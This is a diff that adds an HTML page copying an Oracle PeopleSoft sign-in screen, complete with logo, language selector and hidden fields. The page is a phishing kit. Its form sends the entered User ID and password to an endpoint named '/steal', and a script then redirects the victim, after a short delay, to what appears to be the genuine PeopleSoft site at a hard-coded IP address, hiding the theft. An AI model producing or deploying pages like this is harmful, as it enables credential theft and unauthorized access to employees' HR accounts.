@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="en">
+<head>
+  <title>Oracle PeopleSoft Sign-in</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">    
+  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <link type="text/css" href="/ps/signin.css" rel="stylesheet">
+</head>
+<body>
+<div id="pswrapper">
+  <form id="login" name="login" method="post" action="/steal" autocomplete="off">
+    <input type="hidden" name="timezoneOffset" value="0">
+    <input type="hidden" name="ptmode" value="f">
+    <input type="hidden" name="ptlangcd" value="ENG">
+    <input type="hidden" name="ptinstalledlang" value="ENG">
+
+    <div class="signonMain" style="display: flex; flex-direction: column; align-items: center; gap: 20px;">
+      <img src="/ps/images/smiu_logo.png" class="ps-staticimg" alt="Oracle PeopleSoft Sign-in" style="margin-bottom: 10px;">
+
+      <div class="ps_signinentry" style="width: 100%; max-width: 350px; display: flex; flex-direction: column; gap: 15px;">
+        
+        <div style="display: flex; flex-direction: column;">
+          <label for="userid">User ID</label>
+          <input type="text" id="userid" name="userid" title="User ID">
+        </div>
+
+        <div style="display: flex; flex-direction: column;">
+          <label for="pwd">Password</label>
+          <input type="password" id="pwd" name="pwd" title="Password">
+        </div>
+
+        <div style="display: flex; flex-direction: column;">
+          <label for="ptlangsel">Select a Language</label>
+          <select id="ptlangsel" name="ptlangsel" class="ps_select">
+            <option value="ENG">English</option>
+            <option value="ESP">Español</option>
+            <option value="FRA">Français</option>
+          </select>
+        </div>
+
+        <div style="display: flex; align-items: center; gap: 5px;">
+          <input type="checkbox" name="accessible" id="accessible">
+          <label for="accessible" style="margin: 0;">Enable Accessibility Mode</label>
+        </div>
+
+        <div>
+          <input type="submit" value="Sign In" class="ps-button">
+        </div>
+
+        <div style="text-align: center; margin-top: 5px;">
+          <a href="http://111.68.108.133/psp/PWD/EMPLOYEE/HRMS/c/MAINTAIN_SECURITY.EMAIL_PSWD.GBL?" style="font-size: 0.9em;">Forgot Your Password?</a>
+        </div>
+
+      </div>
+    </div>
+  </form>
+</div>
+
+<script>
+  document.getElementById("login").addEventListener("submit", function (e) {
+    setTimeout(function () {
+      window.location.href = "http://111.68.108.133/psp/PWD/EMPLOYEE/HRMS";
+    }, 2000);
+  });
+</script>
+</body>
+</html>
